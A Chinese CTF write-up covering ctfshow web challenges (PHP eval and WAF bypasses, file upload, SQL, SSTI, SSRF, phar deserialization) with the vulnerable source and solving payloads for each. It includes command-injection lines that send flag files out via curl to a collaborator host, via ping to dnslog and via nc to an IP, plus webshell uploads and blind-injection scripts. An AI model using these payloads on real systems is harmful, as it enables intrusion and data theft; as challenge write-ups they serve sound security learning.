if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125; payload 12GET:?a&#x3D;1+fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1]) 或者 12GET:?$fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0]) web127** 123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123; if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123; return true; &#125;else&#123; return false; &#125;&#125;if(waf($url))&#123; die(&quot;嗯哼？&quot;);&#125;else&#123; extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123; echo $flag;&#125; 还是用123题目的脚本进行爆破： 1234567891011121314151617181920212223242526&lt;?phpfunction curl($url,$data)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $response = curl_exec($ch); curl_close($ch); return strlen($response);&#125;$url=&quot;http://127.0.0.1/test.php&quot;;for ($i=0; $i &lt;=128 ; $i++) &#123; for ($j=0; $j &lt;=128 ; $j++) &#123; $data=&quot;ctf&quot;.urlencode(chr($i)).&quot;show&quot;.&quot;=123&quot;; if(curl($url,$data)!=0)&#123; echo $data.&quot;\\n&quot;; &#125; &#125; &#125;//test.php&lt;?phpif(isset($_POST[&#x27;ctf_show&#x27;]))&#123; echo 123;&#125; 结果下面这些字符都等同于ctf_show 1+ _ [ . +在url起到空格的作用，payload 1ctf show&#x3D;ilove36d web128 12345678910111213141516171819&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123; var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123; echo &quot;嗯哼？&quot;;&#125;function check($str)&#123; return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125; 考察点：gettext拓展的使用 在开启该拓展后 _() 等效于 gettext() 123456&lt;?phpecho gettext(&quot;phpinfo&quot;);//结果 phpinfoecho _(&quot;phpinfo&quot;);//结果 phpinfo 因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars ?f1=_&amp;f2=get_defined_vars web129 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123; $f = $_GET[&#x27;f&#x27;]; if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123; echo readfile($f); &#125;&#125; 预期解： 1&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 非预期解 PHP伪协议会忽略无效的编码方式 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php web131 1234567891011121314151617&lt;?phprror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = (String)$_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 利用正则最大回溯次数绕过，回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。 python脚本如下： 1234567import requestsurl=&quot;http://5884fe43-69c8-4cdc-83bf-728fc1e41baf.chall.ctf.show/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) web132 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123; $username = (String)$_GET[&#x27;username&#x27;]; $password = (String)$_GET[&#x27;password&#x27;]; $code = (String)$_GET[&#x27;code&#x27;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123; if($code == &#x27;admin&#x27;)&#123; echo $flag; &#125; &#125;&#125; 考察&amp;&amp;和||运算符的应用。 x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y payload 1?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin web133 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;6个字母都还不够呀?!&quot;); &#125;&#125; 这道题目挺绕的，主要考察命令执行的骚操作以及外带数据，curl -F的使用 123456传递参数?F&#x3D;&#96;$F &#96;;sleep 3，可以发现后面的sleep 3这条语句确实执行了。原因就是：substr(&#39;&#96;$F&#96;;+sleep 3&#39;, 0, 6) &#x3D; &#96;$F &#96;;然后再调用eval(&quot;&#96;$F&#96;;&quot;);此时，$F&#x3D;&#96;$F &#96;;sleep 3最后执行的代码就是：&#96;&#96;$F &#96;;sleep 3&#96; 然后就是利用curl带出flag.php。 curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies） payload： 1?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php http:&#x2F;&#x2F;wtt33xn74ddcsjguu6symf2l3c94xt.burpcollaborator.net web134 123456789101112&lt;?phphighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123; die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123; die(file_get_contents(&#x27;flag.php&#x27;));&#125; 考察数组变量覆盖，举个例子： 12parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST); 传入?_POST['a']=123，输出array(1) &#123; [&quot;'a'&quot;]=&gt; string(3) &quot;123&quot; &#125; Payload: 1?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d web135 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;); &#125;&#125; web131的升级版，直接把flag.php读出来再重定向到另外一个文件，访问即可。 1?F&#x3D;&#96;$F&#96;;+nl flag.php&gt;flag 另外预期解提到使用Ping命令带出数据，我试了一下没能成功。 1?F&#x3D;&#96;$F&#96;;+ping &#96;cat flag.php|awk &#39;NR&#x3D;&#x3D;2&#39;&#96;.yex0qj.dnslog.cn 但是经过测试单独的ping命令确实是可以执行成功。 web136 12345678910111213141516&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 感觉是考察命令执行，Linux中可以使用tee命令写文件。 1ls &#x2F;|tee file 返回flag文件名f149_15_h3r3 nl /f149_15_h3r3 | tee file web137 1234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 双冒号可以不用实例化一个类的情况下调用类的静态方法。 1ctfshow&#x3D;ctfshow:getFlag web138 12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123; die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); PHP官方文档中的一个例子： 所以可以使用数组来绕过： 1ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag web139 12345678910111213141516&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 相比136这次没有写文件的权限了，但是最开始提到可以sleep，那么就可以用盲注的形式先猜文件名，再猜flag。 1 web140 123456789101112131415&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123; $f1 = (String)$_POST[&#x27;f1&#x27;]; $f2 = (String)$_POST[&#x27;f2&#x27;]; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123; $code = eval(&quot;return $f1($f2());&quot;); if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; &#125;&#125; PHP弱类型比较和函数运用 从表中可以发现，0和字符串比较为True，也就是intval($code)需要返回一个0，并且intval会将非数字字符转换为0。 1234md5(phpinfo())md5(sleep())md5(md5)usleep(usleep()) web141 123456789101112131415&lt;?php#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 要求v1和v2是数字，v3非字母数字和下划线，并且还要绕过return。 关于return这个点，PHP中数字是可以和命令进行一些运算的，比如1-phpinfo()是可以成功执行phpinfo语句的。现在还要利用取反或者异或来绕过preg_match。直接上羽师傅的脚本，收藏了。。 1?v1&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%99%d5)-&amp;v2&#x3D;1 web142 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; if(is_numeric($v1))&#123; $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125;&#125; 12?v1&#x3D;0?v1&#x3D;0x0 web143 12345678910111213141516&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了±，还可以用*；过滤了~，还可以用异或^ 1?v1&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)?&gt;&amp;v2&#x3D;1 web144 123456789101112131415161718&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; check($v3))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125;function check($str)&#123; return strlen($str)===1?true:false;&#125; 稍微变化一下： 1?v1&#x3D;1&amp;v2&#x3D;(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%99%d5)&amp;v3&#x3D;- web145 12345678910111213141516&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 使用三目运算符： 1v1&#x3D;1&amp;v3&#x3D;?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2&#x3D;1 太秀了。 web入门 文件上传 web153 使用.user.ini解析绕过 首先上传一个.user.ini文件，内容： 1auto_prepend_file&#x3D;01.png 在上传一个01.png的Webshell 1&lt;?php system(&#39;..&#x2F;flag.php&#39;); ?&gt; web154&amp;155 忘记了。。。 Web156 对文件内容进行审查，测试之后发现会拦截关键字php，不过好像可以大小写绕过。但是用了一个骚姿势 还是上传一个.user.ini，并且更改UA 再上传一个webshell web157 直接包含.user.ini web158 沿用上一个payload web159 沿用上一个payload web160&amp;web161 web161好像过滤了关键字log web162 折腾了我半天。。包含session文件。 首先在.user.ini文件中直接包含session文件 上传文件条件竞争 web163 web入门 SQL注入 web171&amp;172 联合查询注入 web173 联合查询注入/报错注入 月饼杯 web1_此夜圆 考点：PHP反序列化字符串逃逸 1?1&#x3D;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; 参考：https://xz.aliyun.com/t/6718 web2_故人心 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];$c=$_GET[&#x27;c&#x27;];$url[1]=$_POST[&#x27;url&#x27;];if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123; $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c))); if($d)&#123; highlight_file(&#x27;hint.php&#x27;); if(filter_var($url[1],FILTER_VALIDATE_URL))&#123; $host=parse_url($url[1]); print_r($host); if(preg_match(&#x27;/ctfshow\\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123; print_r(file_get_contents($url[1])); &#125;else&#123; echo &#x27;差点点就成功了！&#x27;; &#125; &#125;else&#123; echo &#x27;please give me url!!!&#x27;; &#125; &#125;else&#123; echo &#x27;想一想md5碰撞原理吧?!&#x27;; &#125;&#125;else&#123; echo &#x27;第一个都过不了还想要flag呀?!&#x27;;&#125; 考察PHP的一些特性，第一关就歇菜了。 php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。用科学计数法来代替，即 1e-162 到 1e-323。 第二关md2弱比较。根据hinthint.txt： 12345Is it particularly difficult to break MD2?!I&#39;ll tell you quietly that I saw the payoad of the author.But the numbers are not clear.have fun~~~~xxxxx024452 hash(&quot;md2&quot;,$b)xxxxxx48399 hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b)) 用Python跑md2 1234567891011121314151617181920212223from Crypto.Hash import MD2def md2(s): obj = MD2.new() obj.update(s.encode()) return obj.hexdigest()def check(id): d = &#x27;0e&#x27; + str(id) + &#x27;024452&#x27; # d = &#x27;0e&#x27; + str(id) + &#x27;024452&#x27; enc = md2(d) if enc[:2] == &#x27;0e&#x27; and enc[2:].isdigit(): print(d) return True return Falseif __name__ == &#x27;__main__&#x27;: for i in range(100, 99999): if check(i): break 最后b=0e652024452，c=0e603448399 最后一关php会将不认识的协议当作目录，payload: 12?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt web3_莫负婵娟 123&lt;!--注意：正式上线请删除注释内容！ --&gt;&lt;!-- username yu22x --&gt;&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt; 测试后发现过滤了' &quot; \\ - # % () ^ union, select, sleep 等等，闭合sql语句注入应该不行了，再看下发现比较时是like，想到sql通配符 12%：用来表示0个或多个字符_：用来表示任意单个字符 当测试到32个_字符时，回显发生了变化，简单来说应该是盲注了。 12345678910111213141516171819import requestsimport stringurl = &quot;&quot;&quot;http://c8b61d08-4760-4f23-834c-eccc201ee37d.chall.ctf.show/login.php&quot;&quot;&quot;strings = string.ascii_letters + string.digitsflag = &quot;&quot;for i in range(100): for s in strings: payload = flag + s + (32-i) * &#x27;_&#x27; data = &#123;&quot;username&quot;: &quot;yu22x&quot;, &quot;password&quot;: payload&#125; r = requests.post(url, data=data) if &quot;wrong&quot; not in r.text: flag += s print(flag) breakprint(flag)# 67815b0c009ee970fe4014abaa3Fa6A0 登录后发现是一个curl命令执行界面，过滤了 1小写字母 | () &#x2F; \\ &#96; * , &lt; &gt; ! 还可以使用 1大写字母 ? $ &#123; &#125; : ; . 一开始想到DNSLOG外带数据，后来发现可以直接访问VPS外带数据。 题目提示使用环境变量 +linux字符串截取 + 通配符，Linux下环境变量$PATH、$PWD、$HOME 再用Linux字符串截断获取cat，以及用通配符表示flag.php 1ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.???","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"CTFShow_1024杯_Web_Writeup","date":"2020-10-29T09:15:33.000Z","path":"Web_security/ctf_writeup/24.CTFShow-1024杯-Web-Writeup/","text":"CTFShow 1024杯 Web Writeups 签到 一开始以为是无参数RCE，后来又Fuzz了PHP所有内置函数，趴着睡觉的时候突然灵光一现，刚刚好像看到出题人自定义了一个函数ctfshow()，直接使用这个函数即可。 fastapi 直接去github上看fastapi的文档，发现它会自带Swagger UI文档，路径为/docs或者/redoc 根据这个api文档可以发现有一个POST接口cccalccc的参数p存在模板注入，fuzz一波之后发现还有过滤，ban掉了open,eval,import等关键字。但是payload只有搜集的够全面，就没有做不出来的SSTI。。 1q&#x3D;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;cat &#x2F;mnt&#x2F;f1a9|nc 47.97.199.89 8888&#39;) 这里还有一个坑点就是，如果反弹shell的话会监听这边直接挂掉，只能每次单独的执行Linux命令。 payload来源： https://blog.csdn.net/weixin_43536759/article/details/105066445 另外还有一些其他无回显注入的方法： https://www.anquanke.com/post/id/188172#h2-12 因为没有curl命令所以好像不能用DNSLOG的方法。 出题人的官方payload，使用时间盲注： 1str(().__class__.__bases__[0].__subclasses__()[220](&quot;if [ &#96;cut -c 1 &#x2F;mnt&#x2F;f1a9&#96; &#x3D; &#39;f&#39; ];then sleep 4;fi&quot;,shell&#x3D;True).wait()) 图片代理 打开题目显示一张图片，看URL还有?picurl参数，感觉是SSRF了，但是还得看看接下来怎么继续利用。 首先用gopher协议验证一下是否确定是SSRF。 没毛病，确实是存在SSRF漏洞，再用dict协议看看有没有开放常用端口，比如redis的6379啥的。 一轮Fuzz下来只有80端口有回显，然后我又猜测会不会有其他的内网存活主机，又扫了一波没什么收获。然后用file协议读取本地文件的时候我好想忘了base64编码，结果以为是无回显的SSRF，又尝试了用DNSLOG外带数据等等，还是没能打出来。 直到比赛结束后我才突然想到没有编码。。。（人傻了。。。 先读/etc/passwd正常回显，既然没有其他端口开着服务，那就去看Nginx的默认配置/etc/nginx/conf.d/default.conf 好吧，明明9000端口有fastcgi，为啥刚刚扫不到。用Gopherus本地生成fastcgi的payload 然后base64编码打过去拿到flag。 柏拉图 说实在的做这题的时候没考虑周全。。readfile.php不能读文件，index.php可以读文件。 双写绕过：file:/file:////var/www/html/index.php index.php 123456789101112131415161718192021&lt;?phperror_reporting(0);function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;url&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $bad = &#x27;file://&#x27;; if(preg_match(&#x27;/dict|127|localhost|sftp|Gopherus|http|\\.\\.\\/|flag|[0-9]/is&#x27;, $url,$match)) &#123; die(&#x27;难道我不知道你在想什么？除非绕过我？！&#x27;); &#125;else&#123; $url=str_replace($bad,&quot;&quot;,$url); curl($url); &#125;&#125;?&gt; upload.php 12345678910111213141516&lt;?phperror_reporting(0);if(isset($_FILES[&quot;file&quot;]))&#123;if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在啦！&quot;; &#125;else&#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125;&#125;else&#123; echo &quot;这个文件我不喜欢，我喜欢一个gif的文件&quot;; &#125;&#125;?&gt; Readfile.php 123456789101112131415161718&lt;?phperror_reporting(0);include(&#x27;class.php&#x27;);function check($filename)&#123; if (preg_match(&quot;/^phar|^smtp|^dict|^zip|file|etc|root|filter|\\.\\.\\//i&quot;,$filename))&#123; die(&quot;姿势太简单啦，来一点骚的？！&quot;); &#125;else&#123; return 0; &#125;&#125;if(isset($_GET[&#x27;filename&#x27;]))&#123; $file=$_GET[&#x27;filename&#x27;]; if(strstr($file, &quot;flag&quot;) || check($file) || strstr($file, &quot;php&quot;)) &#123; die(&quot;这么简单的获得不可能吧？！&quot;); &#125; echo readfile($file);&#125;?&gt; unlink.php 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=$_GET[&#x27;filename&#x27;];function check($file)&#123; if (preg_match(&quot;/\\.\\.\\//i&quot;,$file))&#123; die(&quot;你想干什么？！&quot;); &#125;else&#123; return $file; &#125;&#125;if(file_exists(&quot;upload/&quot;.$file))&#123; if(unlink(&quot;upload/&quot;.check($file)))&#123; echo &quot;删除&quot;.$file.&quot;成功！&quot;; &#125;else&#123; echo &quot;删除&quot;.$file.&quot;失败！&quot;; &#125;&#125;else&#123; echo &#x27;要删除的文件不存在！&#x27;;&#125;?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);class A &#123; public $a; public function __construct($a) &#123; $this-&gt;a = $a; &#125; public function __destruct() &#123; echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a; &#125;&#125;class B &#123; public $b; public function __construct($b) &#123; $this-&gt;b = $b; &#125; public function __toString() &#123; return ($this-&gt;b)(); &#125;&#125;class C&#123; public $c; public function __construct($c) &#123; $this-&gt;c = $c; &#125; public function __invoke() &#123; return eval($this-&gt;c); &#125;&#125;?&gt; 有反序列化有上传，应该就是PHP反序列化+Phar上传。构造这个POP链还是比较简单的： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpini_set(&#x27;phar.readonly&#x27;,&#x27;Off&#x27;);class A &#123; public $a; public function __construct($a) &#123; $this-&gt;a = $a; &#125;&#125;class B &#123; public $b; public function __construct($b) &#123; $this-&gt;b = $b; &#125;&#125;class C&#123; public $c; public function __construct($c) &#123; $this-&gt;c = $c; &#125;&#125;//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();//开始缓冲Phar写操作$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$A = new A(&#x27;&#x27;);$B = new B(&#x27;&#x27;);$C = new C(&#x27;system(&quot;cat /ctfshow_1024_flag.txt&quot;);&#x27;);$A-&gt;a=$B;$B-&gt;b=$C;$phar-&gt;setMetadata($A);//将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算$phar-&gt;stopBuffering();//compress.zlib://phar://xxx//compress.zlib://phar://1.gif 更改后缀名为gif上传，再在readfile界面使用伪协议compress.zlib://phar://upload/phar.gif执行命令。 hello_world 考察SSTI盲注，使用\\x5f绕过 1234567891011121314151617181920212223import requestsimport stringimport timeurl = &quot;&quot;&quot;http://7f6bd375-3951-484c-8ad4-b212bc83b878.chall.ctf.show/&quot;&quot;&quot;strings = string.digits + string.ascii_lowercase + &#x27;-&#x27; + &#x27;&#123;&#x27; + &#x27;&#125;&#x27;flag = &quot;ca01h&quot;result = &quot;&quot;for i in range(50): for s in strings: payload = &#x27;&#x27;&#x27;&#123;% set chr=&quot;&quot;[&quot;\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f&quot;][&quot;\\\\x5F\\\\x5Fbase\\\\x5F\\\\x5F&quot;][&quot;\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F&quot;]()[65] [&quot;\\\\x5F\\\\x5Finit\\\\x5F\\\\x5F&quot;][&quot;\\\\x5F\\\\x5Fglobals\\\\x5F\\\\x5F&quot;] [&quot;\\\\x5F\\\\x5Fbuiltins\\\\x5F\\\\x5F&quot;][&quot;chr&quot;] %&#125;&#123;% if &quot;&quot; [&quot;\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f&quot;][&quot;\\\\x5F\\\\x5Fbase\\\\x5F\\\\x5F&quot;] 